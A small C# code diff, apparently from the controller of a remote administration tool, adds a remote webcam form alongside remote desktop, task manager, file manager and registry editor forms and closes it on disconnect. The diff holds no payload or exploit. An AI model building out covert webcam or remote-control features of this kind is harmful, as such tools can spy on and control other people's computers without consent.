@@ -25,6 +25,7 @@ namespace xServer.Core.Networking
         public string DownloadDirectory { get; set; }
 
         public FrmRemoteDesktop FrmRdp { get; set; }
+        public FrmRemoteWebcam FrmWebcam { get; set; }
         public FrmTaskManager FrmTm { get; set; }
         public FrmFileManager FrmFm { get; set; }
         public FrmRegistryEditor FrmRe { get; set; }
@@ -81,6 +82,8 @@ namespace xServer.Core.Networking
                 {
                     if (FrmRdp != null)
                         FrmRdp.Invoke((MethodInvoker)delegate { FrmRdp.Close(); });
+                    if (FrmWebcam != null)
+                        FrmWebcam.Invoke((MethodInvoker)delegate { FrmWebcam.Close(); });
                     if (FrmTm != null)
                         FrmTm.Invoke((MethodInvoker)delegate { FrmTm.Close(); });
                     if (FrmFm != null)
